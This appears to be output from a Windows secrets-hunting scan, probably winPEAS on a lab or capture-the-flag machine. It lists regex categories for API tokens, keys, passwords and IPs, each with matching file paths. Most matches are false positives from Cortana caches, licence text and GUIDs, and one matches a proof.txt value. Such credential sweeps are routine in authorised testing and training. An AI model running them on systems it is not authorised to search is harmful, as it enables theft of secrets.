+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x27e26f40ye031y48a6yb130yd1f2038                                                                                                                                                                         
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 15063_neutral_neutral_cw5n1h2txy                                                                                                                                                                         
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapps_8wekyb                                                                                                                                                                         
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapps_8wekyb                                                                                                                                                                         
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: immersivecontrolpanel_cw5n1h2txy                                                                                                                                                                         
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: immersivecontrolpanel_cw5n1h2txy                                                                                                                                                                         
+
+???????????? Found APIs-Etsy Access Token Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x4c7a3b7dy2188y46d4ya362
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapp
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapp
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapp
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapp
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x27e26f40ye031y48a6yb130
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapp
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapp
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapp
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapp
+
+???????????? Found APIs-Kucoin Access Token Regexes
+C:\Users\Destitute\Desktop\proof.txt: c1c589dcc1f2796126713eaa
+
+???????????? Found APIs-Mattermost Access Token Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x4c7a3b7dy2188y46d4ya362y1
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x27e26f40ye031y48a6yb130yd
+
+???????????? Found APIs-Plaid Client ID Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x4c7a3b7dy2188y46d4ya362
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapp
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapp
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapp
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapp
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x27e26f40ye031y48a6yb130
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapp
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapp
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapp
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapp
+
+???????????? Found APIs-Travis CI Access Token Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x4c7a3b7dy2188y46d4ya3
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsa
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsa
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsa
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsa
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x27e26f40ye031y48a6yb1
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsa
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsa
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsa
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsa
+
+???????????? Found APIs-Authorization Basic Regexes
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: basic library
+
+???????????? Found APIs-Bittrex Access Key and Access Key Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x4c7a3b7dy2188y46d4ya362y19ac5a5                                                                                                                                                                         
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x27e26f40ye031y48a6yb130yd1f2038                                                                                                                                                                         
+
+???????????? Found APIs-Droneci Access Token Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x4c7a3b7dy2188y46d4ya362y19ac5a5                                                                                                                                                                         
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x27e26f40ye031y48a6yb130yd1f2038                                                                                                                                                                         
+
+???????????? Found APIs-Flickr Access Token Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x4c7a3b7dy2188y46d4ya362y19ac5a5                                                                                                                                                                         
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x27e26f40ye031y48a6yb130yd1f2038                                                                                                                                                                         
+
+???????????? Found APIs-Kucoin Secret Key Regexes
+C:\Users\All Users\Microsoft\UEV\InboxTemplates\DesktopSettings2013.xml: 59031a47-3f72-44a7-89c5-5595fe6b30ee
+C:\Users\All Users\Microsoft\UEV\InboxTemplates\DesktopSettings2013.xml: 59031a47-3f72-44a7-89c5-5595fe6b30ee
+
+???????????? Found APIs-MojoAuth API Key Regexes
+C:\Users\All Users\Microsoft\UEV\InboxTemplates\DesktopSettings2013.xml: 59031a47-3f72-44a7-89c5-5595fe6b30ee
+C:\Users\All Users\Microsoft\UEV\InboxTemplates\DesktopSettings2013.xml: 59031a47-3f72-44a7-89c5-5595fe6b30ee
+
+???????????? Found APIs-Okta Access Token Regexes
+C:\Users\All Users\Microsoft\Windows\ClipSVC\Archive\Apps\9d3ad23c-c6b8-7fb5-e4ab-f5d0a66dcfbc.xml: microsoftsolitairecollection_8wekyb3d8bbwe
+
+???????????? Found APIs-Plaid Secret key Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x4c7a3b7dy2188y46d4ya362y19ac5                                                                                                                                                                           
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x27e26f40ye031y48a6yb130yd1f20                                                                                                                                                                           
+
+???????????? Found APIs-Sendbird Access ID Regexes
+C:\Users\All Users\Microsoft\UEV\InboxTemplates\DesktopSettings2013.xml: 59031a47-3f72-44a7-89c5-5595fe6b30ee
+C:\Users\All Users\Microsoft\UEV\InboxTemplates\DesktopSettings2013.xml: 59031a47-3f72-44a7-89c5-5595fe6b30ee
+
+???????????? Found APIs-Hubspot API Key Regexes
+C:\Users\All Users\Microsoft\Windows\ClipSVC\Archive\Apps\fc93b452-8a84-dede-3b7a-0fc9413c4592.xml: "c38a0a3a-1ebb-425d-a201-1ced2e03ab4a"
+C:\Users\All Users\Microsoft\Windows\ClipSVC\Archive\Apps\fc93b452-8a84-dede-3b7a-0fc9413c4592.xml: "fc93b452-8a84-dede-3b7a-0fc9413c4592"
+C:\Users\All Users\Microsoft\Windows\ClipSVC\Archive\Apps\fc93b452-8a84-dede-3b7a-0fc9413c4592.xml: "e6658c19-4221-2ebe-763a-f0493fba2bb0"
+
+???????????? Found APIs-ORB Intelligence Access Key Regexes
+C:\Users\All Users\Microsoft\Windows\ClipSVC\Archive\Apps\fc93b452-8a84-dede-3b7a-0fc9413c4592.xml: "c38a0a3a-1ebb-425d-a201-1ced2e03ab4a"
+C:\Users\All Users\Microsoft\Windows\ClipSVC\Archive\Apps\fc93b452-8a84-dede-3b7a-0fc9413c4592.xml: "fc93b452-8a84-dede-3b7a-0fc9413c4592"
+C:\Users\All Users\Microsoft\Windows\ClipSVC\Archive\Apps\fc93b452-8a84-dede-3b7a-0fc9413c4592.xml: "e6658c19-4221-2ebe-763a-f0493fba2bb0"
+
+???????????? Found APIs-URLScan API Key Regexes
+C:\Users\All Users\Microsoft\Windows\ClipSVC\Archive\Apps\fc93b452-8a84-dede-3b7a-0fc9413c4592.xml: "c38a0a3a-1ebb-425d-a201-1ced2e03ab4a"
+C:\Users\All Users\Microsoft\Windows\ClipSVC\Archive\Apps\fc93b452-8a84-dede-3b7a-0fc9413c4592.xml: "fc93b452-8a84-dede-3b7a-0fc9413c4592"
+C:\Users\All Users\Microsoft\Windows\ClipSVC\Archive\Apps\fc93b452-8a84-dede-3b7a-0fc9413c4592.xml: "e6658c19-4221-2ebe-763a-f0493fba2bb0"
+
+???????????? Found APIs-Vault Token Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\AC\AppCache\2TP015FD\1\C__Windows_SystemApps_Microsoft.Windows.Cortana_cw5n1h2txyewy_cache_Desktop_11[1].txt: s.getMockedStartMenuGroups
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\AC\AppCache\2TP015FD\1\C__Windows_SystemApps_Microsoft.Windows.Cortana_cw5n1h2txyewy_cache_Desktop_11[1].txt: s.resetPendingSubmitSequen
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\AC\AppCache\2TP015FD\1\C__Windows_SystemApps_Microsoft.Windows.Cortana_cw5n1h2txyewy_cache_Desktop_11[1].txt: s.toggleSelectedSuggestion
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\AC\AppCache\2TP015FD\1\C__Windows_SystemApps_Microsoft.Windows.Cortana_cw5n1h2txyewy_cache_Desktop_11[1].txt: s.SyntheticSuggestionTypes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\AC\AppCache\2TP015FD\1\C__Windows_SystemApps_Microsoft.Windows.Cortana_cw5n1h2txyewy_cache_Desktop_11[1].txt: s.getFolderPathForPathComp
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\AC\AppCache\2TP015FD\1\C__Windows_SystemApps_Microsoft.Windows.Cortana_cw5n1h2txyewy_cache_Desktop_11[1].txt: s.getGroupHeaderClickActio
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\AC\AppCache\2TP015FD\1\C__Windows_SystemApps_Microsoft.Windows.Cortana_cw5n1h2txyewy_cache_Desktop_11[1].txt: s.getGroupTitleAndNarrator
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\AC\AppCache\2TP015FD\1\C__Windows_SystemApps_Microsoft.Windows.Cortana_cw5n1h2txyewy_cache_Desktop_11[1].txt: s.resetPendingSubmitSequen
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\AC\AppCache\2TP015FD\1\C__Windows_SystemApps_Microsoft.Windows.Cortana_cw5n1h2txyewy_cache_Desktop_11[1].txt: s.setRemoveIconForDeviceHi
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\AC\AppCache\2TP015FD\1\C__Windows_SystemApps_Microsoft.Windows.Cortana_cw5n1h2txyewy_cache_Desktop_11[1].txt: s.getMaxNumberOfGroupsToFi
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\AC\AppCache\2TP015FD\1\C__Windows_SystemApps_Microsoft.Windows.Cortana_cw5n1h2txyewy_cache_Desktop_11[1].txt: s.removePendingSuggestionF
+
+???????????? Found APIs-Base32 Regexes
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: SOFTWARE
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: DISCLAIM
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: CONSEQUE
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: SUBSTITU
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: INTERRUP
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: CONTRACT
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: POSSIBIL
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: COPYRIGH
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: LIABILIT
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: LIBFREET
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: FREETYPE
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: WARRANTI
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: HARFBUZZ
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: COPYRIGH
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: HARFBUZZ
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: COPYRIGH
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: COPYRIGH
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: INCIDENT
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: LIABILIT
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: POSSIBIL
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: XKBCOMMO
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: BEGINNIN
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: SOFTWARE
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: SOFTWARE
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: LIABILIT
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: DEALINGS
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: SOFTWARE
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: CONNECTI
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: SOFTWARE
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: INCLUDIN
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: GRAPHICS
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: SOFTWARE
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: SOFTWARE
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: LIABILIT
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: SOFTWARE
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: BEGINNIN
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: COPYRIGH
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: INCLUDIN
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: CONSEQUE
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: TORTIOUS
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: PERFORMA
+
+???????????? Found APIs-Artifactory Password Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\AC\AppCache\2TP015FD\1\C__Windows_SystemApps_Microsoft.Windows.Cortana_cw5n1h2txyewy_cache_Desktop_13[1].txt: AP1aTtUBrtmh
+
+???????????? Found APIs-Base64 Regexes
+C:\Users\All Users\Microsoft\Windows\ClipSVC\Archive\Apps\fc93b452-8a84-dede-3b7a-0fc9413c4592.xml: eyJsZWdhY3lQcm9kdWN0SWQiOiI0MjFiYTg3NC1mOTAzLTQ5NjUtOWI4Mi1kNjBmM2JhM2NhZTAifQ==                                                                                                                                                                    
+
+???????????? Found APIs-RapidAPI Access Token Regexes
+C:\Users\Default\AppData\Local\Microsoft\Windows\Shell\DefaultLayouts.xml: c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy
+
+???????????? Found APIs-Sendbird Access Token Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{632d8ae0-cc75-4a83-916f-63ba63930509}\appsglobals.txt: f22abfeae27a67446927d078890381efc546d3e1                                                                                                                                     
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{632d8ae0-cc75-4a83-916f-63ba63930509}\appsglobals.txt: 4efc125e5bdfe64bf86cc73a85a9d56ebf10231c                                                                                                                                     
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{632d8ae0-cc75-4a83-916f-63ba63930509}\appsglobals.txt: 83453a3d886e527a470b5bb8291dd338de4b1e44                                                                                                                                     
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{632d8ae0-cc75-4a83-916f-63ba63930509}\appsglobals.txt: df14959794357d12ed676dec14aea1901d749645                                                                                                                                     
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{632d8ae0-cc75-4a83-916f-63ba63930509}\appsglobals.txt: 3427d172d24e84772d70149f8c9b4046fc37354c                                                                                                                                     
+
+???????????? Found APIs-Zendesk Secret Key Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{632d8ae0-cc75-4a83-916f-63ba63930509}\appsglobals.txt: f22abfeae27a67446927d078890381efc546d3e1                                                                                                                                     
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{632d8ae0-cc75-4a83-916f-63ba63930509}\appsglobals.txt: 4efc125e5bdfe64bf86cc73a85a9d56ebf10231c                                                                                                                                     
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{632d8ae0-cc75-4a83-916f-63ba63930509}\appsglobals.txt: 83453a3d886e527a470b5bb8291dd338de4b1e44                                                                                                                                     
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{632d8ae0-cc75-4a83-916f-63ba63930509}\appsglobals.txt: df14959794357d12ed676dec14aea1901d749645                                                                                                                                     
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{632d8ae0-cc75-4a83-916f-63ba63930509}\appsglobals.txt: 3427d172d24e84772d70149f8c9b4046fc37354c                                                                                                                                     
+
+???????????? Found APIs-Coinbase Access Token Regexes
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: ----------------------------------------------------------------
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: ----------------------------------------------------------------
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: ----------------------------------------------------------------
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: ----------------------------------------------------------------
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: ----------------------------------------------------------------
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: ----------------------------------------------------------------
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: ----------------------------------------------------------------
+
+???????????? Found APIs-Dropbox API Key Regexes
+C:\Users\All Users\Microsoft\Windows\ClipSVC\Archive\Apps\a7e08b8b-ad4b-af00-ebcc-1aa29a833ce9.xml: slFgAADLAAAAEAAAAIuL4KdLrQCv68waopqDPOnOAAAAZAAAAG0AaQBjAHIAbwBzAG8AZgB0AC4AdwBpAG4AZABvAHcAcwBjAG8AbQBtAHUAbgBpAGMAYQB0AGkAbwBuAHMAYQBwAHA                                                                                                         
+
+???????????? Found APIs-Yandex AWS Access Token Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\AC\AppCache\2TP015FD\1\C__Windows_SystemApps_Microsoft.Windows.Cortana_cw5n1h2txyewy_cache_Desktop_13[1].txt: YCdtbtErZItCiF7Gbul30ISA4RoQCPDPpr8LXgQv
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\AC\AppCache\2TP015FD\1\C__Windows_SystemApps_Microsoft.Windows.Cortana_cw5n1h2txyewy_cache_Desktop_13[1].txt: YCykNYtXB1XrnVMvpsTLFqwlHR9SxXUJPklbgslk
+
+???????????? Found APIs-Twitter Bearer Token Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\AC\AppCache\2TP015FD\1\C__Windows_SystemApps_Microsoft.Windows.Cortana_cw5n1h2txyewy_cache_Desktop_13[1].txt: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABPUy8yAAABWAAAAEgAAABgSlp47lZETVgAAAGgAAACBQAABeCBXolxY21hcAAAA6gAAAMRAAAE4mKSO9NjdnQgAAAGv
+
+???????????? Found Misc-Code asigning passwords Regexes
+C:\Users\All Users\VMware\VMware CAF\pme\install\caf-dbg.ps1: password = $null,
+
+???????????? Found Misc-Simple Passwords Regexes
+C:\Users\All Users\VMware\VMware CAF\pme\install\caf-dbg.ps1: password = $null,
+
+???????????? Found Misc-IPs Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 11.8.204.0
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 1.4.101.0
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 4.18.56.0
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 4.5.6.0
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 1.8.12.150
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 1.8.12.150
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 017.125.40.0
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 017.125.40.0
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 6.2.0.0
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 6.2.0.0
+
+???????????? Found Misc-Config Secrets Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{632d8ae0-cc75-4a83-916f-63ba63930509}\settingssynonyms.txt: credential manager  *|credentials   3452
+
